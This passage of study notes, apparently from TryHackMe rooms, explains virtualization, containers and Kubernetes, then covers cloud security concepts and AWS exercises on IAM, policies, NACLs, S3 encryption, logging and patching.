interact with the underlying host operating system.

To
 answer the above question, we need to expand the definition of 
virtualization. Formally, virtualization abstracts or creates an **abstraction layer** over
 computer hardware. An abstraction layer allows a single device to be 
divided into multiple virtual computers, also known as virtual machines 
(VMs).

In simpler terms, this means that the virtual machine will have access to *logical resources* that are abstracted away from the *physical resources*.

# Virtualization Structure

Virtualization
 is implemented using an engine-machine format, which means that a 
software or system creates an abstraction layer and allocates resources,
 while an operating system or application can then be installed on top 
of this virtualized environment. The operating system installed in a 
virtual machine is known as a **guest OS**, as opposed to the **host OS** on which the virtualization engine is running.

In the next task, we will introduce our first virtualization engine type - **hypervisors**.

**Hypervisors**

In
 the previous task, we introduced the concept of virtualization at a 
high level and briefly discussed the structure of virtualization. In 
this task, we will present our first type of virtualization engine: **hypervisors**.

A
 hypervisor provides the ability to create the abstraction layer between
 hardware and software. A hypervisor will also generally include some 
form of management application or software to provide an interface 
between the end user and the abstraction layer to create or load virtual
 machines.

Hypervisors are separated into two categories that 
are determined by their position relative to the hardware. They can 
either directly create a lightweight operating system on top of the 
hardware that is the hypervisor or add a hypervisor as an application on
 top of a pre-existing operating system.

# Type 1 Hypervisors

**Type 1 hypervisors**, also known as **bare metal hypervisors**,
 create an abstraction layer directly between hardware and virtual 
machines without a common operating system between them. Instead, the 
hypervisor is the operating system and is often *headless*,
 with only a web-based management portal remotely accessed. These 
hypervisors are designed for scale and to deploy a large number of 
virtual machines at once. They are extremely lightweight to dedicate the
 most resources to virtual machines. Below is a diagram of a type 1 
hypervisor architecture.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/10f4dce97b527ea3d144442b2190270c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/10f4dce97b527ea3d144442b2190270c.png)

Examples of type 1 hypervisors include VMware ESXi, Proxmox, VMware vSphere, Xen, and KVM.

# Type 2 Hypervisors

**Type 2 hypervisors**, also known as **hosted hypervisors**,
 create an abstraction layer from a software application built on top of
 a pre-existing operating system. Unlike type 1 hypervisors, type 2 
hypervisors are often managed directly from the application through a 
GUI. These hypervisors are often designed for end-users or individuals 
such as developers and are not strictly designed to run a large number 
of virtual machines for scale. Below is a diagram of a type 2 hypervisor
 architecture.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/44d3a52445a0194a28eb710bf16f52d6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/44d3a52445a0194a28eb710bf16f52d6.png)

Examples of type 2 hypervisors include VMware Workstation, VMware Fusion, VirtualBox, Parallels, and QEMU.

**Containers**

Hypervisors work as 
expected for a large number of use cases but begin to encounter issues 
when scaling lightweight applications. *Microservices* give us a 
good example of an application architecture that encounters issues when 
deployed from a hypervisor. A microservice is an application structure 
that is broken up into smaller services that are scalable and use 
lightweight protocols and features. The lightweight nature of the 
architecture poses obvious issues to hypervisors that require a large 
number of virtual machines each with high resource usage.

**Containers** are the current solution to the issues encountered with hypervisors at scale.

# What are Containers

Containers
 have a lot in common with virtual machines, but instead of being 
completely abstracted from the host operating system, containers share 
some properties with the host operating system. Containers have their 
own filesystem, a portion of computing resources (CPU, RAM), a process 
space, and more.

Apart from the obvious benefits of being lightweight, containers are also *portable* and *robust* because they are not completely abstracted.

Container
 engines are our second type of virtualization. As virtual machines use a
 hypervisor to create an abstraction layer for virtualization, 
containers use a container engine to create an abstraction layer using 
logical resources.

**Docker**

If someone is familiar 
with containers, Docker is likely the first name that comes to mind. 
Docker is a container platform and engine that is used to run Docker 
"images" as containers.

Each Docker image is built of a base 
image, such as Alpine or Ubuntu, that is specifically built for use in 
containers and is lightweight. To build a Docker image, a Dockerfile 
must be created, which defines the base image for a container and any 
commands to be run.

For more information about Docker, check out the [Intro to Docker](https://tryhackme.com/room/introtodockerk8pdqk) room.

# Running and Interacting with a Docker Container

Docker
 Hub is a remote repository for Docker images, similar to GitHub - a 
remote repository for Git. Using Docker Hub, we can pull Docker images 
created by others or push our own.

```bash
docker pull <user>/<image>

```

Alternatively, a container image can be automatically 
pulled when running the container for the first time. Once a container 
is pulled for the first time, it will be cached locally, and Docker will
 look for it locally before attempting to download it.

```bash
docker run <user>/<image>

```

Once the image is started, we can verify that the Docker
 engine is running the container by listing the processes running in 
Docker using the below command.

```bash
docker ps

```

From the above command, you may notice that the 
container will be assigned a random identifier, IP address, and network 
interface.

**Kubernetes**

Through the use of hypervisors and containers, most problems associated with traditional computing are resolved, such as *cost* and *efficiency*.
 This still leaves the question, what if we need a faster and more 
scalable solution? That is, as load or other criteria changes, the 
resources or the number of instances allocated to the application or 
service increase or decrease on the fly as needed.

**Kubernetes**, also shortened to "**K8s**," is one such solution known as an **orchestration platform**.
 An orchestration platform aims to integrate into other products, such 
as Docker, and extend their capabilities or "synchronize" them with 
other products or applications.

Kubernetes relies on these 
traditional virtualization models like hypervisors and containers and 
extends their uses, features, and capabilities.

These capabilities and features include the following:

- **Horizontal scaling**: Unlike traditional "vertical"
scaling, "horizontal" scaling refers to adding devices or machines to
handle increased workload, rather than adding logic resources such as
CPU or RAM.
- **Extensibility**: Clusters can be modified dynamically without affecting containers outside of the intended group.
- **Self-healing**: K8s can automatically restart,
replace, reschedule, and kill containers that are not properly
functioning based on user-defined health checks.
- **Automated rollouts and rollbacks**: K8s can
progressively roll out changes to containers. As changes are made, it
will monitor the application's health and decide whether to continue the rollout or rollback. This ensures the constant uptime of your cluster
even if some containers fail.

## **CLOUD SECURITY NITRO**

**Introduction**

Cloud computing is one
 of the IT industry's most common and evolving terms. In simple terms, 
it means delivering computing services over the internet. The customer 
does not need to buy and maintain physical data centres and servers in 
cloud computing. Instead, all services can be used with **pay-as-you-go pricing** (pay as per the usage of the services) and on an as-needed basis (we can access services when needed).

**Architectural Concepts of Cloud**

**Characteristics of Cloud**

A
 few years back, no one could even imagine that organisations would 
place their data and operations on a geographically miles away platform 
that unknown people would manage. However, cloud computing is becoming 
so popular that organisations of every type and size use it for 
different purposes, such as storing data, taking backups, disaster 
recovery and Business Continuity Operations (BCO). It is becoming 
popular due to the following characteristics:

- **Scalability**: In cloud computing, organisations only buy resources at a time. Instead,
they buy upon the need. Also, resources can be scaled up or down as per
business needs and requirements.
- **Simplicity**: Renowned
cloud service providers believe in simple design &
interface. Usually, the customer only needs to buy and use the cloud
services with little configuration.
- **Cost Effective**: Cloud computing allows us to pay for our services. The cost is reduced as a
third party provides infrastructure and does not need to be purchased at once.
- **Enhance Automation**: ****Cloud computing
services require limited human administration, so companies can focus
more on their goals without worrying about managing and maintaining
systems.

**Models of Cloud Computing**

The following three cloud computing models are based on what the cloud provider offers and the needs of customers/organisations.

**Infrastructure as a Service (IaaS)**

In
 IaaS, infrastructure is provided by cloud providers. The customer has 
complete control of operating systems, services and applications.

- Cloud Provider’s Responsibility: Maintaining and providing data centres with racks, machines, cables, and utilities.
- Customer’s Responsibility: In this case, the customer manages logical resources like software and operating system.

**Platform as a Service (PaaS)**

It contains all services offered in IaaS with the addition of an operating system (the user manages that in IaaS).

- Cloud Providers’ Responsibility: In Platform as a Service, a cloud provider
offers infrastructure and platform. Customers can choose any platform as per their needs. The service provider is responsible for managing the
infrastructure and platform.
- Customer's Responsibility: Customers can install software as per their requirements.

**Software as a Service (SaaS)**

It includes every service that is being provided in IaaS and
PaaS.

- Cloud Providers’ Responsibility: In SaaS, everything is managed by the cloud
provider, including infrastructure, OS and software.
- Customer Responsibility: ****This model
is used by customers who need more technical skills in managing things.
They only pay and use the services without worrying about the underlying architecture.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/f04ce2f08624ac4c7973ad4e6e6275cd.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/f04ce2f08624ac4c7973ad4e6e6275cd.png)

**Cloud Deployment Models**

**Public Cloud**

In the public cloud, as the name suggests, resources provided by cloud providers are shared among multiple customers. **Organisation A**
 will use resources from the same hardware that offers services to any 
other organisation. For example, Microsoft Azure and Amazon Web Services
 (AWS) are examples of public clouds. However, they also offer Virtual Private Cloud (VPC) services.

**Private Cloud**

In
 the private cloud, customers will not share the underlying resources 
(hardware and software) as in the public cloud, and resources are 
dedicated to a single customer. **Organisation A** will get a Virtual machine hosted on a system specifically dedicated to a particular customer.

**Hybrid Cloud**

It is a combination of a public and private cloud. For example, **Organisation A**
 might want to use some private cloud resources (to host confidential 
data of the production system) but also want some public cloud (for 
testing of the applications/software) so that the production system does
 not crash during testing.

# Important Terminologies

There are some essential terminologies of cloud computing that one needs to understand. Some of the concepts are defined below:

- **Virtualisation:** Virtualisation is the primary technology used in cloud computing that allows sharing
of instances of an application or resources among multiple customers or
users simultaneously.
- **Compute:** Defined as the processing
power customers require to run their applications and systems for data
processing and carry out different tasks. In cloud computing, customers
can get computing power from a combination of virtual machines hosted in the cloud environment.
- **Storage:** In cloud computing, we
do not need to buy and maintain physical hard drives; instead, our data
is stored in logical pools of physical storage on cloud provider
premises, and we can scale up and scale down the resources as per needs.
- **Networking:** As cloud computing is a system of computers/processes that are
interconnected, maintaining a high-speed network connection is very
important. The cloud provider is responsible for providing network
connectivity to meet customer needs without disruption.

**Cloud Security Concepts**

To understand cloud security concepts, first, we need to know what we need to protect in the cloud. The simple answer is "**Data**".
 Data is an asset and can be anything and any piece of information that 
any customer or organisation has. Data must be categorised into 
different levels (as defined below) before sharing in cloud platforms so
 that appropriate controls can be applied to protect it from a security 
point of view. There are three main classes of data depending on their 
sensitivity:

- **Confidential data:** Confidential data can be considered the most critical data any organisation can
have. Confidential information/data, if exposed, can damage an
organisation’s reputation and even includes personally identifiable
information.
- **Internal data:** Internal data is information that, if exposed, causes moderate risk or harm to the company.
- **Public data:** Public data is any information included on (or intended for) the public. There is no consequence if public data is leaked because it’s already meant
for use by everyone.

**Cloud Data Lifecycle**

In today’s world, organisations store and use large amounts of data, including critical and sensitive data of the customers. Data on the cloud should be managed through its lifecycle to ensure its secure usage in every phase.

**Major Steps**

Data life cycle means the sequence of steps a particular data goes through from its creation to its deletion phase.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/6ffcd9635986909d32ad621e95827e1c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/6ffcd9635986909d32ad621e95827e1c.png)

# Security Aspects in Cloud Data Lifecycle

Each
 phase of the cloud data lifecycle requires protection. Below are the 
cloud data lifecycle stages, security considerations and requirements.

**Create/Update**

The
 create phase is the initial phase of the data lifecycle. It includes 
the newly created data and data that is being freshly imported from 
other data sources. ****In this phase, the data owner should be 
defined, and categorisation or classification of data should be done. 
Security aspects and challenges in this phase are as below:

- **Implementing SSL/TLS:** Secure communication through SSL/TLS should be implemented so that it will be
difficult for the attacker to listen to data transferred between the
customer and the cloud provider.
- **Encryption:** Data should be encrypted so that if data is exposed, the attacker cannot read it without decrypting it.
- **Secure connections:** Secure connections and paths should be established for the data transfer so
that change of data breach is minimised (ensures data security in
transit).

**Store**

Data is processed 
based on its form (structured or unstructured) and stored in a container
 generally known as a database. Security aspects at this stage are as 
below:

- **Encryption:** Data should be encrypted to protect data at rest.
- **Backup:** Backup should be taken to prevent data loss; if data is lost, it can be restored from the available backups.

**Use**

As
 we know, if data is encrypted, it must be decrypted to be used by the 
application. Security aspects include the following means:

- **Secure connections:** Encrypted paths should be established before data transfer to ensure the confidentiality and integrity of data in transit.
- **Secure platform:** A secure authentication mechanism should be used, protected from attacks and vulnerabilities.
- **Restrict Permissions:** Data owners should set strict permissions to modify and process data from unauthorised persons.
- **Secure Virtualisation:** There is the concept of virtualisation in cloud computing in which resources
among users are shared. So cloud providers need to ensure that one
customer's data should not visible to other customers.

**Share**

Share data within or outside the cloud infra; challenges include:

- **Jurisdiction:** Regulatory mandates/restrictions of sharing data across specific locations/regions.
- **Data Loss Prevention (DLP):** Data Loss Prevention (DLP) helps to detect and prevent data breaches or unwanted destruction of
sensitive data. It contains sensitive data from being shared with
unauthorised persons.

**Archive**

Long-term storage of data and applications; security aspects include:

- **Encryption:** Data should be encrypted before storing in cloud premises
- **Physical Security:** It demands that the storage servers are physically secured and prevented from unauthorised access through biometrics, CCTV, etc.
- **Location:** Reflects a physical location where data will be stored. Environmental factors
such as natural disasters, climate, etc., can pose risks and consider
Jurisdictional aspects (local and national laws) are key factors at this stage.
- **Backup Procedure:** How will data be recovered when required and How often full/incremental backups will be carried out?

**Destroy**

Data
 should be destroyed once of no use so that it cannot be misused by any 
user (intentional or unintentional). Crypto shredding is a process in 
which encrypted data is useless by destroying cryptographic keys 
(without keys, data cannot be decrypted).

# Security Issues in the Cloud & its Solution

Despite
 the benefits of cloud computing, several security challenges must be 
addressed effectively. These challenges raise concerns about fundamental
 security properties such as confidentiality, integrity and 
availability. Significant issues are as defined below:

- **Data confidentiality:** When the data is hosted in the cloud, its privacy is at risk. As users have
no physical access to their data once it has been outsourced, they don’t know how the confidentiality of their data is being maintained. Cloud
service providers can examine the data of the users without detection.
- **Virtualisation issues:** It allows the resources to be shared among the users. We need a
mechanism to ensure isolation and secure communication between VMs.
Users are not isolated in a multitenant environment, so one user can
examine the data of another user.
- **Insecure interfaces and API:** Cloud services are managed by the customers with the help of software or APIs. So vulnerable software or API can be risky, and data or customer confidentiality and integrity are at risk.
- **Malicious insiders:** Some malicious insiders can cause the data breach of other clients.
Taking advantage of shared technology vulnerabilities, these insiders
can leak the data of other users or exploit security weaknesses, thus
causing security threats to the other customers on the cloud.
- **Account or service hijacking:** Several methods can cause account or service hijacking. These include
phishing frauds, vulnerability exploitation and password reuse among
users.
- **Access Control Mechanism (ACM):** In a cloud
computing environment, users and cloud servers are not in the same
domain. Enforcing efficient and reliable access to information is
critical when data is outsourced to the cloud. An unauthorised person
can gain access to the data due to a lack of access control rights.

**Cloud Security Risks Concerning Deployment Models**

This task will 
briefly discuss various cloud deployment models and their associated 
risks. Read along the following topics to get an understanding of 
various cloud models.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/0793905dd65076f2f379c5fa59e7afef.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/0793905dd65076f2f379c5fa59e7afef.png)

*Click to enlarge the image.*

# Private Cloud

As
 studied, a private cloud is an environment in which resources are 
dedicated to a single customer. These are suitable for customers that 
are more concerned about the security of their data. Associated risks 
are as under:

- **Personnel threats**: This includes both unintentional and intentional threats. Customers have no
control over the provider’s data centre and administrators. Any insider
can cause damage to customers’ data (either intentionally or
unintentionally).
- **Natural disasters**: Private cloud is vulnerable to natural disasters.
- **External attacks**: Multiple attacks, such as unauthorised access, Man-in-the-middle
attacks, and Distributed Denial of Service, can compromise the user’s
data.

# Public Cloud

In the public cloud, resources among users are shared with the help of virtualisation technology. Some risks include:

- **Vendor Lock-In**: The customer becomes a dependent service provider in the public Cloud. It
becomes nearly impossible for the customer to move the data out of the
cloud infra before the end of the contract term; thereby, the customer
becomes the hostage of the provider.
- **Threat of new entrants**: Your cloud provider may provide services to your competitor in the public cloud.
- **Escalation of Privilege Authorised**: In the public cloud, users may try to acquire unauthorized permissions. A user who gains illicit administrative access may be able to gain
control of devices that process other customers’ data.

# Community Cloud

Computing & storage infrastructure is shared between a specific community or organisation members. Some risks include:

- **Vulnerability**: In a community cloud, any node may have vulnerabilities, which can also
cause intrusions on the other nodes. Also, in a community, cloud
configuration management and baselines are almost impossible (and very
difficult to enforce).
- **Policy and administration**: It is challenging to enforce decisions and procedures in the community cloud, posing a severe challenge and threat.

**Security Through Access Management**

Access 
management is an important feature that ensures that the “right people” 
should do the “right job” within the “right set of permissions”. Access 
management has a critical role in cloud security as data is stored over 
the internet, and due to a plethora of cyber-attacks, it is inherently 
insecure. In cloud computing, Access Management is implemented through 
the following measures:

- **Create Identities**: Cloud infrastructure creates “digital identities” that can relate to a person, user, API or service. An entity is a set of properties that can be recorded.
- **Authentication Factors**: Each identity is allocated with a specific set of characteristics
unique to that particular identity and helps to distinguish it from
other identities. If they are matched, then the essence of that user is
confirmed. These characteristics are called “Authentication Factors”,
which include: username, password, PIN, biometric, certificate, FaceID,
etc.
- **Roles**: Each identity has a specific role which defines the domain under which that particular identity functions.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/fa212dcaa2ed9400ff34bd738c96f363.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/fa212dcaa2ed9400ff34bd738c96f363.png)

In
 Amazon, Access Management is implemented through Identity & Access 
Management (IAM). IAM is considered the “heart of access management” 
services to configure & perform fine-grained control and access 
policies to AWS
 resources. It is a web service that enables Amazon users to grant 
access to various services & resources to different users.

# Features of IAM

- Give rights & permissions of resources in your amazon account to other people without sharing passwords, etc.
- Grant role-based access to users based on their access rights.
- Enable multi-factor authentication.
- Enable and manage permissions and access policies across amazon accounts & resources.

**IAM Important Terminologies**

To understand IAM, we must be very clear about its important terminologies:

- Resources: These are objects within a particular service; these include users, roles, groups & policies.
- Identities: Represent certain users permitted and authorised to perform specific roles and actions.
- Entities: A subset of resources which are used for authentication purposes. It includes users & roles.
- Principals: A person or some application requesting to use Amazon resources after signing in.

# Using Cloud Environment

We will use examples from Amazon Web Services (

AWS

)
 throughout the room. Although the room can be completed with the 
provided text and image content, the practical exercises require an AWS 
account. Having an AWS account is optional for this room, but if you are
 interested, you can visit

[this URL](https://aws.amazon.com/premiumsupport/knowledge-center/create-and-activate-aws-account/)

to understand how to create and activate a new

AWS

account.

# Practical Exercise

Create an IAM user account with administrative privileges in your AWS account. IAM users with administrative privileges will have complete access to AWS resources. Moreover, it can grant permissions to other users as well.

- Login to your AWS account by visiting `console.aws.amazon.com` and navigating “IAM” in the services menu.
- Go to “Users” in the navigation pane and click `Add users`.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/8967b943f4df9c8b56e595d909cf3eb3.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/8967b943f4df9c8b56e595d909cf3eb3.png)

*Click to enlarge the image.*

- Enter the new username and the user's sign-in name, and Select if you want the user to access AWS Management Console.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/c6ebccd84b5da6072f57346bbac57cb9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/c6ebccd84b5da6072f57346bbac57cb9.png)

*Click to enlarge the image.*

- Choose “Next” to go to permissions. Since no group is created, so click on `Create Group`.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/08ea9d71e2ceebefa8206b1752a0400b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/08ea9d71e2ceebefa8206b1752a0400b.png)

*Click to enlarge the image.*

- Enter the group name & check `AdministratorAccess` Policy.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/4b0ed147bc5256c6657f2c72828613aa.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/4b0ed147bc5256c6657f2c72828613aa.png)

*Click to enlarge the image.*

- Click `Create Group` and then `Review` to go through the settings. If everything is up to the mark, then click **Create User**.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/f410aae3bc377d58fde05ab1f7b08a85.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/f410aae3bc377d58fde05ab1f7b08a85.png)

*Click to enlarge the image.*

- The user has been created. Save the essential details such as username, Password, etc.

**Security Through Policies**

Another method of 
ensuring cloud security is through enforcing policies & permissions.
 Policies are a set of guidelines and controls which attach to 
identities and make permissions. The cloud infrastructure evaluates the 
permissions defined in the policy to determine whether the request 
should be allowed or denied whenever an identity requests any service. 
In a typical cloud environment, there are the following types of 
policies:

- **Identity-based Policies:** Attached to identities and grant permissions.
- **Resource-based Policies:** These are implemented on resources (data & services) and define who is authorised to access that resource.
- **Session-based Policies:** These temporary policies allow access to specific resources for a particular time.

**Security through Policies in AWS**

In AWS,
 policies are implemented by AWS IAM. As we have already covered the 
features of IAM in the previous task, we will directly see how policies 
are implemented.

# Practical Exercise

Consider a scenario where a user wants to access resources during a particular date & time.

- Login to your AWS account, Open `IAM` in the services menu and click on `Open Policies`.
- Click on Create Policy - AWS IAM provides two approaches to create a policy, i.e. via **JSON & Visual Editor**.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/1af10d5e41969adfbab9726628825bfc.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/1af10d5e41969adfbab9726628825bfc.png)

*Click to enlarge the image.*

- To define a policy, we first select a service and determine a certain
action on a particular resource under a specific condition.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/0c3983925940fafca5e7f4f56c07d7be.gif](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/0c3983925940fafca5e7f4f56c07d7be.gif)

- In the above example, we have selected the service RDS and denied all
permissions. We can attach the policy with an identity so the user
cannot access the RDS service. The primary idea is to have a granular
level of access control through policies to restrict or enable access to a specific resource.

**Security Through Network Management**

Network security is 
an essential component of cloud security to protect the infrastructure 
from intruders. Cloud computing is inherently different from the 
on-premises model, wherein various approaches, including physical 
firewalls, protect on-premises deployments. Generally, network security 
of cloud infrastructure is maintained by following a layered approach:

- **Layer 1 – Network Security through Security Groups:** Security groups are the most fundamental aspect of maintaining network security
in cloud infrastructure. In simple terms, security groups are a set of
“allow rules” that allows specific traffic. Contrary to traditional
firewalls, security groups do not have “deny rules”. The absence of any
"allow rule" against particular traffic means it is denied. So we can
say that security groups operate on the principle of “**deny all unless allowed explicitly**”.
- **Layer 2 – Network Security through Network Access Control Lists (NACLs):** The concept of NACL is related to protecting the Virtual Private Cloud (VPC). NACLs are used to create rules to protect specific instances of VPC.
NACLs are different from Security Groups in that NACLs contain "deny
rules" as well; e.g. we may make a rule to block a particular IP address from accessing the VPC.
- **Layer 3 - Vendor Specific Security Solutions:** Cloud computing service providers are also well aware of the inherent
weaknesses & cyber-attacks that can target their infrastructure. So
they have deployed their specific security solutions. These solutions
vary from vendor to vendor, e.g. AWS has DNS Firewall & Network Firewall both.

# Network Security in

The following components manage network security in AWS:

- Security Groups.
- Network Access Control List.
- DNS Firewall.
- Network Firewall

# Practical Exercise

In this exercise, we will Deny All traffic on Port 22 via NACL through the following steps:

- Login to your AWS account & Navigate to VPC in the services menu
- Open NACL in the left pane & Click on `Create Network ACL`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/27a7e6804af7c85aab377dee257e83de.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/27a7e6804af7c85aab377dee257e83de.png)

- Enter basic settings such as name, VPC and tags (optional) and click create network ACL

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/5633090f4e814a93ef56daee69300a42.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/5633090f4e814a93ef56daee69300a42.png)

- Select the newly created ACL and Click on `Edit Inbound Rules` under the **Inbound Rules** tab. Now create a “New rule” and configure settings as shown in the figure below:
    
    ![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/6afd4758b63de391b92954db713f824a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/6afd4758b63de391b92954db713f824a.png)
    

The
 above rule will deny all the traffic at port 22. We can also 
allowlist/blocklist specific IPs for connecting to any port to limit the
 attack surface for the intruder.

**Security Through Storage Management**

As we have studied in
 Task 2, storage is crucial in cloud computing. Storage security in a 
cloud environment aims to ensure that data must remain safe while at 
rest and in transit during the various phases of the data lifecycle. The
 following approaches provide cloud storage protection:

- **Create Geographical Boundaries**: Define geographical regions and set policies permitting data access.
- **Set Role-based Authorisation**: Create identities and assign roles to access a particular data set per the rights and privileges.
- **Data Encryption**: Almost all cloud service providers allow data encryption at rest. With
this approach, server-side encryption is applied to data.

# Important Aspects

For any storage (file, database, etc.), the following aspects are of utmost importance:

- Connection String with database containing hostname, username and password must be used using secure means.
- Access security policy.
- Data encryption standards.
- Physical security measures by the cloud service provider.

# Storage Security in

The cloud environment provides different types of data repositories to store data. In terms of AWS,
 we have Relational Database Service (RDS), Simple Storage Service (S3),
 Redis, etc., to keep and retrieve data. Data security is ensured by 
applying various policies to database instances per the data 
sensitivity.

# Practical Exercise

In this example, we will Create S3 Bucket and enable data encryption at rest.

- Login to your AWS account & Navigate to S3 in the services menu.
- Click on create bucket & Enter basic information such as bucket name, AWS region, etc. The bucket name must be globally unique; there can’t be two buckets with the same name.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/decdf0e61a8147e0f00220c278ee10a5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/decdf0e61a8147e0f00220c278ee10a5.png)

- Enable Server Side Encryption and select `Encryption Key Type`. For the demo, we have selected “Amazon S3 managed keys".
- Now click, `Create bucket`. Congrats, you have created your first S3 bucket with server-side encryption.

**Cloud Security - Some Additional Concepts**

# Disaster Recovery (DR) & Backup

Cloud
 is considered an excellent source for establishing Disaster Recovery 
and Backup sites. In cloud computing environments, there is a famous 
terminology known as **Cloud Disaster Recovery (CDR)**, a combination
 of approaches, tools & techniques that ensures backup data, 
resources and other applications on cloud infrastructure. In case of any
 disaster, cloud service providers provide backups of on-premises 
environments to ensure the regular continuity of business operations. 
Following are the essential concepts in terms of Disaster & Recovery
 in cloud computing through the following three approaches:

- **Cold DR**: This is the most straightforward approach and inexpensive but has the
largest RTO (Recovery Time Objective). It entails storing data and
saving images & snapshots of machines. All snapshots must be
recovered to resume business operations in a disaster situation.
- **Warm DR**: It works on the principle of near real-time synchronisation of actual
data and applications with disaster sites. A copy of all data and
services is being maintained at the DR setup, hosted on a cloud
environment. This data is just being kept as a backup to resume business operations in a disaster scenario. When a disaster occurs, the DR site
is configured to resume operations. RTO, in this case, is the time
required for configuring the DR site to become operational.
- **Hot DR**: It has practically zero RTO but is the most expensive. In this
approach, the actual and DR sites work in parallel and share the
workload through load balancers. In case of disaster, all workload is
shifted to the DR site.

**Security through Monitoring & Logging**

It
 is accurate to say that monitoring and logging are the hallmarks of 
maintaining security, and cloud computing is no exception. Nowadays, 
cloud service providers provide excellent approaches to logging and 
monitoring. Customers can take advantage of this option to keep an 
oversight on all the operations of their cloud environment. Following 
are some generic logging and monitoring approaches in a cloud computing 
environment:

- **Real-time Logging**: Almost all cloud service providers monitor and log all identities and resources.
- **Monitoring & Logging of API Calls**: All cloud instances have the provision for recording API calls made to cloud infrastructure. Typical logs include the source IP address of the user or service, time, etc.
- **Credential Reports**: Another essential thing that cloud service provider monitors are user
accounts logs. Common logged factors include user account, account last
used date, password last change data and password last used date, etc.

**Monitoring & Logging into AWS**

The following components manage monitoring and logging in

AWS

:

- Identity & Access Management: Basic logging features related to access
management, e.g. logs credential reports of user accounts.
- CloudTrail: Logs all API calls made to AWS resources.
- CloudWatch: Monitors the entire cloud infra and informs about applications status
performance changes, ensuring better resource utilisation.
- GuardDuty: Ensures continuous monitoring of malicious activity and unauthorised behaviour.

**Practical Exercise**

In this exercise, we will generate Credential Report for the AWS
 account. IAM provides an excellent feature of generating a credential 
report that lists all users and the status of their credentials, 
including passwords, Multi-Factor Authentication Status, usage & 
change history.

- Login to your AWS account by visiting `console.aws.amazon.com` & Navigate to `IAM` in the services menu.
- In the navigation pane, choose `Credential Report` & click “Download Report” on the next page.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/ec07297c40b3667a7d9eaaee18069e17.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/ec07297c40b3667a7d9eaaee18069e17.png)

*Click to enlarge the image.*

- The report will be downloaded in CSV format and contain various vital fields, such as `password_last_used, password_last_changed, user_creation_time, etc`.

**Updates & Patching**

Updating
 & patching is an essential parts of the calculus of the entire 
security paradigm. In cloud computing environments, “Automated & 
Scheduled Patch Management” ensures that security and other related 
updates are routinely applied.

**Patch Management in AWS**

Patch management in AWS is managed by a component called “Systems Manager”. Patch Management in AWS has the following concepts:

- Patch manager ensures automatic & scheduled updating of cloud resources
and can be used to update operating systems and applications.
- Provides scanning option to scan complete infrastructure regarding missing patches.

**Practical Exercise**

In this exercise, we will gain an understanding of AWS Patch Manager.

- Log in to your AWS account & Open `Systems Manager` from the services menu.
- Open `Patch Manager` in the left window under Node Management and click on `Create Patch Policy`.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/208c9165ddb2c4d01bd9f919e041d85a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/208c9165ddb2c4d01bd9f919e041d85a.png)

- There are two types of patching mechanisms, i.e., Patches without a Schedule and Scheduled Patching.

